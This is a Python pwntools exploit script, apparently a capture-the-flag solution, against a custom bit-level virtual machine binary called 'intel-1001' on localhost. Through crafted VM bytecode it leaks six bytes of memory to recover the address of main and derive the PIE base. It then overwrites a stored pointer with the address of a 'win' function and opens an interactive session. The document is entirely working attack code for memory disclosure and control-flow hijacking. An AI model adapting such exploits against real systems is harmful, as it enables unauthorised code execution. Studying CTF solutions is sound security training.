#!/usr/bin/env python3
from pwn import *
import re

context(arch="amd64", os="linux")

HOST = "localhost"
PORT = 31337

if True:
    # io = process("../intel-1001")
    io = remote(HOST, PORT)
else:
    io = gdb.debug(
        "../intel-1001",
        """
    #pie break 0x00002075
    pie break 0x000020b2
    continue
    """,
    )


def asm_r0_imm(b):
    return (b << 4) | (0 << 0)


def asm_xchg_rx_r0(r):
    return (r << 4) | (1 << 0)


def asm_load_r0():
    return 2 << 0


def asm_store_r0():
    return 3 << 0


def asm_exit():
    return 8 << 0


def write_bit(addr, bit, value):
    res = []
    target = (addr << 3) | (bit << 0)
    for i in range(0, 16):
        bitval = (target >> (15 - i)) & 1
        res += [asm_r0_imm(bitval), asm_xchg_rx_r0(i)]
    res += [asm_r0_imm(value), asm_store_r0()]
    return res


def read_bit_r0(addr, bit):
    res = []
    target = (addr << 3) | (bit << 0)
    for i in range(0, 16):
        bitval = (target >> (15 - i)) & 1
        res += [asm_r0_imm(bitval), asm_xchg_rx_r0(i)]
    res += [asm_load_r0()]
    return res


def read2_bit_r0(addr, bit):
    res = []
    target = (addr << 3) | (bit << 0)
    # print(f"Target: {target:#016b}")
    bitmax = 11
    for i in range(bitmax):
        bitval = (target >> (bitmax - i - 1)) & 1
        res += [asm_r0_imm(bitval), asm_xchg_rx_r0(i + 5)]
    res += [asm_load_r0()]
    return res


def asm_charin():
    return 6


def write2_bit_r0_charin(addr, bit):
    res = []
    target = (addr << 3) | (bit << 0)
    # print(f"Target: {target:#016b}")
    bitmax = 11
    for i in range(bitmax):
        bitval = (target >> (bitmax - i - 1)) & 1
        res += [asm_r0_imm(bitval), asm_xchg_rx_r0(i + 5)]
    res += [asm_charin(), asm_store_r0()]
    return res


def asm_charout():
    return 7 << 0


io.recvline_contains(b"Debug?")
io.send(b"1")


operations = []
# 0x1028 = 0b1000000000000
operations += [asm_r0_imm(1), asm_xchg_rx_r0(0)]

for offset in range(6):
    for bitidx in range(8):
        operations += read2_bit_r0(0x38 + offset, bitidx)
        operations += [asm_charout()]

for offset in range(6):
    for bitidx in range(8):
        operations += write2_bit_r0_charin(0x28 + offset, bitidx)

operations += [asm_exit()]

payload = bytes(operations)
payload = payload.ljust(0x1000, b"\0")

io.recvline_contains(b"Input vm code:")
io.send(payload)

OFFSET_MAIN = 0x00001FC4
OFFSET_WIN = 0x00001290

bits = []
for _ in range(8 * 6):
    bitpattern = b"(1|0) -> OUT"
    bitline = io.recvline_regex(bitpattern)
    bitmatch = re.search(bitpattern, bitline)
    bits.append(int(bitmatch[1]))

bitstring = "".join(f"{x}" for x in bits)[::-1]
addr_main = int(bitstring, 2)
log.info("Address main: %x", addr_main)
addr_base = addr_main - OFFSET_MAIN
log.info("Address base: %x", addr_base)
addr_win = addr_base + OFFSET_WIN
log.info("Address win: %x", addr_win)

io.send(p64(addr_win)[:6])

io.recvline_contains(b"Exiting??")
io.interactive()
